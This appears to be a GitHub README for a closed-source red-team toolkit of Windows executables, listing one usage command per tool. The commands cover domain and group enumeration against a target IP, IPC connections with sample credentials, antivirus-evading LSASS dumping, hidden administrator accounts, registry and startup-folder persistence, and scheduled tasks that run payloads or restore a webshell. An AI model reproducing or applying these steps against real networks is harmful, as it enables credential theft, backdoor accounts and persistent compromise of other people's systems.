# RedTeamTools

###### Tools developed during the personal learning process，if you find some problem I hope you can give me a issue let me know how to become better，thanks

###### Tools are not open source, use them and cherish them

## 01Get Target User

```
new1.exe \\192.168.3.144
```

## 02Get Target Local Administrators Group

```
new2.exe administrators \\192.168.3.144
```

## 03Get Target All Local Group

```
new3.exe \\192.168.3.144
```

## 04Get Target Goup Member

```
new4.exe "domain admins" \\192.168.3.144
```

## 05Make The IPC Connect

```
new5.exe \\192.168.3.144 rootkit.org\sqladmin Admin12345
```

## 06Delete The IPC Connect

```
new6.exe \\192.168.3.144
```

## 07Get The Internet Session To Help Find The Domain Manager

```
new7.exe \\192.168.3.144
```

## 08Get Login User To Help Find The Domain Manager

```
new8.exe \\192.168.3.144
```

## 09Dump Lsass BypassAV

```
new9-1.exe
```

## 10Fast Information Collection

```
You can use in the workgroup OR domain computer
new10_domain.exe > 1.txt
new10_workgroup.exe > 2.txt
```

## 11Add Admin User BypassAV

```
new11.exe user pass
11.vbs #direct to use
easy11_direct.exe #direct to use   admininfo:support_win2019$/NoBase64==
easy11.dll  #rundll32 easy11.dll admin  admininfo:DefaultAccount$/NoBase64==
```

## 12Write The Registry

```
12.exe
```

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/12-1.png)

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/12-2.png)

## 13Write The Start Dir

```
13.exe
Make sure your tar exe in the C:\Windows\Temp\Updating.exe
```

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/13.png)

## 14Taskplan To Exec Your EXE

```
14.exe c:\123\321.exe A
Very to use，like to this
```

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/14-1.png)

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/14-2.png)

![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/14-3.png)

## 15Taskplan To Backup Your WEBSHELL

```
15x32.exe C:\phpstudyWWW\shell.php A
Very to use，like to this
```

![](https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20A%20Scheduled%20Task%20BypassAV%EF%BC%88WEBSHELL%EF%BC%89/image-20210920145033771.png)

![](https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20A%20Scheduled%20Task%20BypassAV%EF%BC%88WEBSHELL%EF%BC%89/image-20210920145309610.png)
